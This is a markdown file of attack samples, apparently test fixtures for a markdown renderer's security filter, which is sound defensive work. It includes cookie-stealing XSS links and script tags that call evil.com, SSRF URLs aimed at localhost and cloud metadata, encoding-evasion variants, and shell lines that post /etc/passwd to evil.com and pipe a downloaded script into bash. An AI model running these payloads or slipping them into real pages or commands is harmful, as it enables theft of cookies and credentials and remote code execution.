# Attack Samples for Testing

These are examples of malicious content that should be blocked by security measures.

## 1. XSS via JavaScript Links

```markdown
[Click me for a prize](javascript:alert('XSS'))
[Open this](javascript:document.location='http://evil.com/steal?'+document.cookie)
[Download file](javascript:window.location='http://malware.com/virus.exe')
```

## 2. Script Tag Injection

```markdown
<script>
fetch('http://evil.com/steal', {
    method: 'POST',
    body: document.cookie
});
</script>

<script src="http://malicious.com/malware.js"></script>

<img src="x" onerror="fetch('http://evil.com/steal?cookie='+document.cookie)">
```

## 3. Base64 DoS Attack

```markdown
![Large image](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...[500KB of base64]...)

![Malicious JS](data:text/javascript;base64,YWxlcnQoJ1hTUycpOw==)

![HTML injection](data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=)
```

## 4. SSRF Vectors

```markdown
[Internal API](http://localhost:3000/admin/users)
[Database](http://127.0.0.1:5432)
[Cloud metadata](http://169.254.169.254/latest/meta-data/)
[Internal network](http://192.168.1.1/admin)
```

## 5. Protocol Injection

```markdown
[WhatsApp](whatsapp://send?text=phishing)
[Phone](tel:premium-900-number)
[Email](mailto:phishing@evil.com?subject=Urgent)
[File](file:///etc/passwd)
[FTP](ftp://user:pass@ftp.server.com/secrets)
```

## 6. HTML Injection

```markdown
<iframe src="http://evil.com/phishing.html" width="0" height="0"></iframe>

<form action="http://evil.com/steal" method="POST">
    <input type="hidden" name="data" value="sensitive">
</form>

<link rel="stylesheet" href="javascript:alert('XSS')">

<meta http-equiv="refresh" content="0;url=http://evil.com">
```

## 7. Markdown Protocol Block with Malicious Content

```propact:shell
# This looks harmless but contains malicious commands
curl -X POST http://evil.com/exfiltrate -d "$(cat /etc/passwd)"
wget -O- http://malware.com/payload.sh | bash
```

## 8. Large Content Attack

```propact:rest
# Generate large payload to cause memory issues
{
  "data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..." [1MB of As]
}
```

## 9. Encoding Evasion

```markdown
[JavaScript link](javascripT:alert('XSS'))
[Mixed case](JAVASCRIPT:alert('XSS'))
[With spaces](java%0d%0ascript:alert('XSS'))
[Hex encoded](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;)
```

## 10. Combined Attack

```markdown
# Innocent looking document

Here's an image: ![logo](data:image/png;base64,[large payload])

And a link: [Documentation](javascript:fetch('http://evil.com/steal?c='+document.cookie))

<script>
// Hidden malware
setInterval(() => {
    fetch('http://evil.com/beacon', {method: 'POST', body: navigator.userAgent});
}, 5000);
</script>

---

```propact:rest
POST /exfiltrate
Host: evil.com
Content-Type: application/json

{"data": "sensitive_information_from_api"}
```
```
